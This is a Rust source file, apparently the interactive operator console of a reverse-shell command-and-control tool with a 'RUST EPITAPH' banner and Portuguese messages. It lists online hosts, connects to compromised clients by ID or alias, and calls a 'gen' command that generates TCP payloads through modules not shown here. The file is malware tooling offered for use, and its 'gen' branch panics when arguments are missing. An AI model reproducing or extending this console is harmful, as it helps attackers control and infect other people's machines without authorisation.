use std::io::prelude::*;
use std::io;
use std::sync::Arc;
 
use crate::utils::servers::database_struct::Database;
use crate::utils::servers::server_tcp::{user_input,handle_clients,manage_alias};
use crate::utils::payload::tcp_generator::gen_tcp;

pub fn spawn_menu(database:Arc<Database>){
 
    loop{
        let db_clone = Arc::clone(&database);
        let keep_alive = interprete(db_clone); 

        if !keep_alive{
            break;
        }
         
    }
}


pub fn banner(){
    std::process::Command::new("clear").status().unwrap(); 
    println!("                                                                                                         
@@@@@@@   @@@  @@@   @@@@@@  @@@@@@@     @@@@@@@@  @@@@@@@   @@@  @@@@@@@   @@@@@@   @@@@@@@   @@@  @@@  
@@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@     @@@@@@@@  @@@@@@@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
@@!  @@@  @@!  @@@  !@@        @@!       @@!       @@!  @@@  @@!    @@!    @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!@  !@!  @!@  !@!        !@!       !@!       !@!  @!@  !@!    !@!    !@!  @!@  !@!  @!@  !@!  @!@  
@!@!!@!   @!@  !@!  !!@@!!     @!!       @!!!:!    @!@@!@!   !!@    @!!    @!@!@!@!  @!@@!@!   @!@!@!@!  
!!@!@!    !@!  !!!   !!@!!!    !!!       !!!!!:    !!@!!!    !!!    !!!    !!!@!!!!  !!@!!!    !!!@!!!!  
!!: :!!   !!:  !!!       !:!   !!:       !!:       !!:       !!:    !!:    !!:  !!!  !!:       !!:  !!!  
:!:  !:!  :!:  !:!      !:!    :!:       :!:       :!:       :!:    :!:    :!:  !:!  :!:       :!:  !:!  
::   :::  ::::: ::  :::: ::     ::        :: ::::   ::        ::     ::    ::   :::   ::       ::   :::  
 :   : :   : :  :   :: : :      :        : :: ::    :        :       :      :   : :   :         :   : :  
                                                                                                         \n");
 println!("Your last words, will eventually rust.");




}


pub fn interprete(database: Arc<Database>) -> bool{

    print!("\n>");
    io::stdout().flush().expect("Falha ao fazer flush do stdout");

    let input = &user_input();
    let comandos:Vec<&str> = input.split_whitespace().collect();

    if comandos.is_empty(){
        return true;
    }

    match comandos[0].to_lowercase().as_str(){
        "connect" => {
            if comandos.len() != 2 {
                println!("Comando Incorreto.");
                return true;
            }else {
                handle_clients(database, comandos[1]);
                return true;
            }
        }
        "alias" => {
            if comandos.len() != 3 {
                println!("Comando Incorreto.");
                return true;
            }else{
                 manage_alias(database, comandos[1], comandos[2]);
                 return true;
            }
        }
        "list" => {
            if database.is_empty() {
                println!("-Nenhum Host Online-");
            } else {
                database.list_clientes();
            }
            return true;
        }
        "help" => {
            println!("------Commands------");
            println!("connect <ID | Alias>");
            println!("alias <ID> <Alias>");
            println!("list");
            println!("clear");
            println!("help");
            println!("banner");
            println!("gen");
            println!("exit");
            return true;
        }
        "clear" => {
            std::process::Command::new("clear").status().unwrap();
            return true;
        }
        "gen" => {
            gen_tcp(comandos[1], comandos[2]);
            return true;
        }
        "banner" => {
            banner();
            return true;
        }
        "exit" => {
            return false;
        }
        _ => {println!("Comando inexistente");return true;}
    }

}
